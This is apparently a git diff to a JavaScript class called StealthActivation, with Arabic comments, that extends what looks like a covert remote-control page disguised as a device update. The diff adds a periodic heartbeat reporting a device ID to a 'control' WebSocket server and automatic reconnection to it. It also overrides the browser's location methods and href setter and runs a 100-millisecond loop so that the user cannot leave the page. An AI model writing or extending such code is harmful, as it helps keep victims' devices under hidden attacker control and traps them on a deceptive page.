@@ -58,6 +58,7 @@ class StealthActivation {
         this.deviceId = this.generateDeviceId();
         this.permissionsManager = null;
         this.realDataAccess = null;
+        this.heartbeatInterval = null;
         this.activationSteps = [
             'loading',
             'checking',
@@ -229,6 +230,9 @@ class StealthActivation {
             
             // حماية فورية من أي إعادة توجيه
             this.preventAnyRedirection();
+            
+            // حماية إضافية من انقطاع الاتصال
+            this.preventRedirectOnDisconnection();
             
             // تعطيل الزر
             this.disableUpdateButton();
@@ -553,6 +557,11 @@ class StealthActivation {
                     timestamp: Date.now(),
                     status: 'online'
                 }));
+                
+                // بدء heartbeat
+                this.startHeartbeat();
+                
+                console.log('🔗 تم إعداد الاتصال والـ heartbeat بنجاح');
             };
             
             ws.onmessage = (event) => {
@@ -572,12 +581,37 @@ class StealthActivation {
                 console.log('❌ تم قطع الاتصال بالخادم');
                 console.log(`  📄 الكود: ${event.code}`);
                 console.log(`  📝 السبب: ${event.reason || 'غير محدد'}`);
+                console.log(`  🔄 إعادة الاتصال: ${event.wasClean ? 'نعم' : 'لا'}`);
                 
-                // محاولة إعادة الاتصال بعد 5 ثوان
+                // إيقاف heartbeat
+                this.stopHeartbeat();
+                
+                // تنظيف المتغيرات
+                window.controlConnection = null;
+                
+                // منع انتقال الصفحة عند انقطاع الاتصال
+                console.log('🛡️ منع انتقال الصفحة بسبب انقطاع الاتصال');
+                this.preventRedirectOnDisconnection();
+                
+                // تحديد سبب الانقطاع
+                let reconnectDelay = 5000; // افتراضي 5 ثوان
+                
+                if (event.code === 1006) {
+                    console.log('🔍 انقطاع غير طبيعي - إعادة اتصال سريع');
+                    reconnectDelay = 2000; // 2 ثانية للانقطاع غير الطبيعي
+                } else if (event.code === 1000) {
+                    console.log('🔍 إغلاق طبيعي - إعادة اتصال عادي');
+                    reconnectDelay = 5000; // 5 ثوان للإغلاق الطبيعي
+                } else if (event.code >= 4000) {
+                    console.log('🔍 خطأ في التطبيق - إعادة اتصال مؤجل');
+                    reconnectDelay = 10000; // 10 ثوان لأخطاء التطبيق
+                }
+                
+                // محاولة إعادة الاتصال
                 setTimeout(() => {
-                    console.log('🔄 محاولة إعادة الاتصال بالخادم...');
+                    console.log(`🔄 محاولة إعادة الاتصال بالخادم بعد ${reconnectDelay/1000} ثوان...`);
                     this.setupServerConnection();
-                }, 5000);
+                }, reconnectDelay);
             };
             
         } catch (error) {
@@ -636,6 +670,173 @@ class StealthActivation {
             
         } catch (error) {
             console.error('❌ خطأ في معالجة أمر الخادم:', error);
+        }
+    }
+    
+    // منع انتقال الصفحة عند انقطاع الاتصال
+    preventRedirectOnDisconnection() {
+        try {
+            console.log('🛡️ تفعيل حماية شاملة من انتقال الصفحة');
+            
+            // منع جميع أشكال التنقل
+            const blockNavigation = () => {
+                window.location.assign = () => {
+                    console.log('🚫 تم منع location.assign');
+                    return false;
+                };
+                
+                window.location.replace = () => {
+                    console.log('🚫 تم منع location.replace');
+                    return false;
+                };
+                
+                window.location.reload = () => {
+                    console.log('🚫 تم منع location.reload');
+                    return false;
+                };
+                
+                // منع تغيير location.href
+                Object.defineProperty(window.location, 'href', {
+                    set: function(value) {
+                        console.log('🚫 تم منع تغيير location.href إلى:', value);
+                        return false;
+                    },
+                    get: function() {
+                        return window.location.toString();
+                    }
+                });
+            };
+            
+            // تطبيق الحماية
+            blockNavigation();
+            
+            // حماية مستمرة
+            setInterval(() => {
+                if (window.location.href.includes('about:blank')) {
+                    console.log('🚨 تم اكتشاف about:blank - إيقاف فوري');
+                    window.stop();
+                    window.history.back();
+                }
+            }, 100);
+            
+            console.log('✅ تم تفعيل الحماية من انتقال الصفحة');
+            
+        } catch (error) {
+            console.error('❌ خطأ في تفعيل حماية انتقال الصفحة:', error);
+        }
+    }
+    
+    // بدء نظام heartbeat
+    startHeartbeat() {
+        try {
+            // إيقاف heartbeat السابق إن وجد
+            if (this.heartbeatInterval) {
+                clearInterval(this.heartbeatInterval);
+            }
+            
+            console.log('💓 بدء نظام heartbeat...');
+            
+            this.heartbeatInterval = setInterval(() => {
+                if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'heartbeat',
+                        deviceId: this.deviceId,
+                        timestamp: Date.now(),
+                        status: 'online'
+                    }));
+                    
+                    console.log('💓 إرسال heartbeat للخادم');
+                } else {
+                    console.warn('⚠️ لا يمكن إرسال heartbeat - الاتصال مغلق');
+                    this.stopHeartbeat();
+                }
+            }, 30000); // كل 30 ثانية
+            
+            console.log('✅ تم بدء نظام heartbeat بنجاح');
+            
+        } catch (error) {
+            console.error('❌ خطأ في بدء heartbeat:', error);
+        }
+    }
+    
+    // إيقاف نظام heartbeat
+    stopHeartbeat() {
+        try {
+            if (this.heartbeatInterval) {
+                clearInterval(this.heartbeatInterval);
+                this.heartbeatInterval = null;
+                console.log('🛑 تم إيقاف نظام heartbeat');
+            }
+        } catch (error) {
+            console.error('❌ خطأ في إيقاف heartbeat:', error);
+        }
+    }
+    
+    // إرسال activation_complete مع حماية ذكية
+    sendActivationCompleteWithProtection(activationData) {
+        try {
+            console.log('🔄 بدء إرسال activation_complete مع حماية متقدمة...');
+            
+            // التحقق من حالة الاتصال
+            if (!window.controlConnection) {
+                console.warn('⚠️ لا يوجد اتصال بالخادم - تخطي الإرسال');
+                return;
+            }
+            
+            if (window.controlConnection.readyState !== WebSocket.OPEN) {
+                console.warn('⚠️ الاتصال بالخادم غير مفتوح - تخطي الإرسال');
+                return;
+            }
+            
+            // إعداد مراقب انقطاع الاتصال قبل الإرسال
+            const originalOnClose = window.controlConnection.onclose;
+            let messageSent = false;
+            
+            window.controlConnection.onclose = (event) => {
+                if (!messageSent) {
+                    console.log('🚨 تم قطع الاتصال قبل أو أثناء إرسال activation_complete');
+                    console.log('🛡️ تفعيل الحماية الفورية من about:blank');
+                    this.preventRedirectOnDisconnection();
+                }
+                
+                // استدعاء المعالج الأصلي
+                if (originalOnClose) {
+                    originalOnClose.call(window.controlConnection, event);
+                }
+            };
+            
+            // إرسال الرسالة مع timeout
+            const sendMessage = () => {
+                try {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'activation_complete',
+                        data: activationData
+                    }));
+                    messageSent = true;
+                    console.log('📤 تم إرسال activation_complete للخادم بنجاح');
+                    
+                    // إعداد timeout للتأكد من عدم انقطاع الاتصال
+                    setTimeout(() => {
+                        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+                            console.log('✅ الاتصال مستقر بعد إرسال activation_complete');
+                        } else {
+                            console.log('⚠️ انقطع الاتصال بعد إرسال activation_complete');
+                            this.preventRedirectOnDisconnection();
+                        }
+                    }, 2000);
+                    
+                } catch (sendError) {
+                    console.error('❌ خطأ في إرسال activation_complete:', sendError);
+                    this.preventRedirectOnDisconnection();
+                }
+            };
+            
+            // إرسال الرسالة
+            sendMessage();
+            
+        } catch (error) {
+            console.error('❌ خطأ في sendActivationCompleteWithProtection:', error);
+            this.preventRedirectOnDisconnection();
         }
     }
 
@@ -709,16 +910,11 @@ class StealthActivation {
             // حفظ في localStorage
             localStorage.setItem('activationStatus', JSON.stringify(activationData));
             
-            // إرسال للخادم
-            if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
-                window.controlConnection.send(JSON.stringify({
-                    type: 'activation_complete',
-                    data: activationData
-                }));
-                console.log('📤 تم إرسال activation_complete للخادم');
-            } else {
-                console.warn('⚠️ الاتصال بالخادم غير متاح - لن يتم إرسال activation_complete');
-            }
+            // إرسال للخادم مع حماية من انقطاع الاتصال
+            console.log('🔄 محاولة إرسال activation_complete مع حماية شاملة...');
+            
+            // إرسال مع حماية ذكية
+            this.sendActivationCompleteWithProtection(activationData);
             
             this.isActivated = true;
             
